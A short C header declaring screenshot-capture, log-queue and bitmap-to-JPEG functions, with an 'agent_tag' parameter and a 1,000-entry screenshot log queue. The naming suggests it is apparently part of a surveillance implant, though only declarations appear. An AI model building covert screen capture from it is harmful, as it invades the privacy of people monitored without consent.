#ifndef _SCREENSHOT_H
#define _SCREENSHOT_H
#pragma pack(1)
#define LOG_SNAP_VERSION 2009031201

typedef struct _SNAPSHOT_ADDITION_HEADER {
	UINT uVersion;
	UINT uProcessNameLen;
	UINT uWindowNameLen;
} SNAPSHOT_ADDITIONAL_HEADER, *PSNAPSHOT_ADDITIONAL_HEADER;

typedef struct 
{
	DWORD dwSize;
	LPBYTE lpBuffer;
} SCREENSHOT_LOGS, *LPSCREENSHOT_LOGS;

#define MAX_SCREENSHOT_QUEUE 1000
extern SCREENSHOT_LOGS lpScreenshotLogs[MAX_SCREENSHOT_QUEUE];

PBYTE TakeScreenshot(PULONG uOut);
VOID ScreenshotMain();
BOOL QueueScreenshotLog(__in LPBYTE lpEvBuff, __in DWORD dwEvSize);
PBYTE BmpToJpgLog(DWORD agent_tag, BITMAPINFOHEADER *pBMI, size_t cbBMI, BYTE *pData, size_t cbData, DWORD quality, PULONG uOut);

#endif